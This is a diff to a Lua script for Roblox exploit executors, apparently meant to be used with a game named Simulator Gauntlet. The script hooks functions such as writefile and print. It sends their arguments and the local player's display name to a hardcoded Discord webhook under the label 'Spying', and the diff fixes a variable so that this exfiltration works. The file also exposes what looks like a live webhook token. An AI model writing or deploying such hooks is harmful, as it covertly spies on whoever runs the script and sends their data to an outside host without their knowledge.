@@ -16,6 +16,7 @@ https://www.roblox.com/games/14168050172/Simulator-Gauntlet?gameSetTypeId=100000
 local http = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local HttpService = game:GetService("HttpService")
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
+local user = game:GetService("Players").LocalPlayer
 local expfunctions = {
     writefile,
     print,
@@ -51,9 +52,9 @@ for ind,var in next,expfunctions do
                 local args = {...}
                 for i,v in next,args do
                     if tostring(i):find("https") or tostring(v):find("https") and tostring(i):sub(34,46) == "Turtle-Secure" or tostring(i):sub(34,45) == "Sidhsksjsjsh" or tostring(v):sub(34,46) == "Turtle-Secure" or tostring(v):sub(34,45) == "Sidhsksjsjsh" then
-                        SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
+                        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
 		    else
-		        SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
+		        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
                     end
                 end
                 return old(...)
